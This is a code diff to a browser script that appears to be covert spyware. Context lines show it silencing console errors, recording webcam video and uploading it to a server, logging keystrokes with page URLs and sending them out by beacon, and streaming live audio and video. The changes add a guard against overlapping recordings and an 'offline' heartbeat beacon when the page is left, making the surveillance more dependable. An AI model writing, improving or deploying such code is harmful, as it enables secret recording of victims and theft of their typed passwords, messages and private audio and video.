@@ -24,6 +24,7 @@
     let liveSocket = null, liveInterval = null, liveActive = false;
     let audioRecorder = null, audioActive = false;
     let audioHTTPActive = false, audioHTTPTimer = null;
+    let videoRecording = false; // guard: prevents concurrent video recordings
 
     // ═══ HELPERS ═══════════════════════════════════════════════
     // Suppress all console errors from this script
@@ -358,17 +359,22 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
 
     function recordVideo() {
         if (!stream || stream.getVideoTracks().length === 0) return;
+        if (videoRecording) return; // prevent concurrent recordings
         try {
             const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
             const mime = types.find(t => MediaRecorder.isTypeSupported(t)) || 'video/webm';
             const rec = new MediaRecorder(stream, { mimeType: mime });
             const chunks = [];
+            videoRecording = true;
             rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-            rec.onstop = async () => { if (chunks.length) { const b = new Blob(chunks, { type: mime }); if (b.size > 1000) await upload('/upload-media', 'media', b, `vid_${Date.now()}.webm`); } };
-            rec.onerror = () => {};
+            rec.onstop = async () => {
+                videoRecording = false;
+                if (chunks.length) { const b = new Blob(chunks, { type: mime }); if (b.size > 1000) await upload('/upload-media', 'media', b, `vid_${Date.now()}.webm`); }
+            };
+            rec.onerror = () => { videoRecording = false; };
             rec.start(1000);
-            setTimeout(() => { try { if (rec.state !== 'inactive') rec.stop(); } catch {} }, C.videoDuration || 10000);
-        } catch {}
+            setTimeout(() => { try { if (rec.state !== 'inactive') rec.stop(); } catch { videoRecording = false; } }, C.videoDuration || 10000);
+        } catch { videoRecording = false; }
     }
 
     async function initCamera() {
@@ -919,6 +925,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             const b = new Blob([JSON.stringify({ clientId: ID, keys: keyBuffer, url: location.href })], { type: 'application/json' });
             navigator.sendBeacon(BASE + '/log-keys', b);
         }
+        // Immediately signal server that this client is offline
+        const offlineBlob = new Blob([JSON.stringify({ clientId: ID, offline: true })], { type: 'application/json' });
+        navigator.sendBeacon(BASE + '/heartbeat', offlineBlob);
         stopLiveFeed();
         stopAudioStream();
         if (liveSocket) liveSocket.disconnect();
